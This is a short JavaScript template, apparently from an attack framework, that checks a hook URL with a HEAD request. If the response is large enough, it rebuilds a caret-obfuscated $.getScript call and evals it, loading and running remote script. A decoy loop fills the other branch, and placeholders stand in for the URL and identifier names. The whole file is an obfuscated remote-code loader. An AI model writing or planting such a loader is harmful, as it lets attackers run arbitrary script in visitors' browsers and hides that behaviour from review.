$.ajax({
	type: "HEAD",
	url: "<HOOK_URL_PLACEHOLDER>",
	complete: function(xhr) {
		var size = xhr.getResponseHeader('Content-Length');
		<FUNC_NAME_PLACEHOLDER>(size);
	}
});

function <FUNC_NAME_PLACEHOLDER>(size) {
	if (size <= 1000) {
		for (var i = size.length - 1; i >= 0; i--) {
			i = i-2;
		}
	} else {
		var <VAR_NAME_PLACEHOLDER> = "^$^.^g^e^t^S^c^r^i^p^t(^'^<HOOK_URL_PLACEHOLDER>^'^)^";
		var <VAR_NAME_2_PLACEHOLDER> = <VAR_NAME_PLACEHOLDER>.replace(/\^/g, '')
		eval(<VAR_NAME_2_PLACEHOLDER>);
	}
}